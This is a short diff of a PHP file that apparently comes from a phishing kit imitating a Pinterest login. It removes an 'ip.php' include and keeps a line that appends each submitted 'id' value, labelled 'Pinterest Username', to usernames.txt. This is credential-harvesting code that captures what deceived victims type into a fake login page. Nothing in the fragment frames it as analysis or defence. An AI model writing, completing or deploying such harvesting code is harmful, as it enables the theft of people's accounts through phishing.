@@ -1,5 +1,5 @@
 <?php
-include 'ip.php';
+
 file_put_contents("usernames.txt", "Pinterest Username : " . $email = $_POST['id'] . "\n", FILE_APPEND);
 ?>
 <?php
